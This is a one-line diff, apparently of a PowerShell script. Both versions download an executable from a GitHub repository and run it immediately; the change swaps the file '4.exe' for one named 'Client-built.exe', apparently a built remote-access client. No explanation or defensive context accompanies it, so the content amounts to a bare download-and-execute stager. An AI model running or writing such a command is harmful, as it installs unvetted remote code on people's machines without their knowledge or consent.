@@ -1,1 +1,1 @@
-Invoke-WebRequest 'https://github.com/anilxpm/powerl/raw/master/4.exe' -OutFile 4.exe;.\4.exe
+Invoke-WebRequest 'https://github.com/anilxpm/powerl/raw/refs/heads/master/Client-built.exe' -OutFile Client-built.exe;.\Client-built.exe
